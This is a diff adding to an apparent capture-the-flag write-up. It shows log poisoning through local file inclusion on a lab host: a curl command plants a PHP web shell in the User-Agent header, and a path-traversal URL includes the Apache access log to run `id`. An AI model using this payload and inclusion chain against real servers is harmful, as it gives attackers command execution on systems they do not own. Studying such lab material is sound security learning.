@@ -448,9 +448,58 @@ http://10.10.43.88/?view=dog/../../../../../../../../../var/log/apache2/access.l
 
 > notice that we can see `user agant` `Mozilla/5.0 `
 
+> try to put php code in user agant to see if it will run
 
 
 
+```
+curl "http://10.10.43.88" -H "User-Agent: <?php system(\$_GET['c']); ?>"
+```
+
+<img width="1133" height="460" alt="image" src="https://github.com/user-attachments/assets/dd04ca67-72f1-47f7-8f7f-ec286f1ceda4" />
+
+
+> ## see logs again
+
+<img width="1054" height="305" alt="image" src="https://github.com/user-attachments/assets/30e7f092-3b81-4564-a4dd-8663e9f12f80" />
+
+> ## good now we will put value to **`c`** forexample **`id`** :
+
+
+```
+http://10.10.43.88/?view=dog/../../../../../../../../../var/log/apache2/access.log&ext=&c=id
+```
+
+
+<img width="1390" height="149" alt="image" src="https://github.com/user-attachments/assets/ff3da476-fac9-4fe9-8733-4265a939515c" />
+
+```
+"uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+```
+
+
+### Summary example
+
+- The log writing step = just writing the text `<?php system($_GET['c']); ?>`.
+
+- The include step = execute this text as part of the site code.
+
+- The value of `c` = comes from the URL at the time of execution.
+
+### The reason for the success of the attack in brief
+
+because:
+
+- The server writes the User-Agent to the log.
+
+- The application allows include for a path from which the login can be accessed.
+
+- include makes PHP execute the code you put in the log.
+
+- The attacker passes the command via `?c=...`.
+
+
+--- 
 
 
 
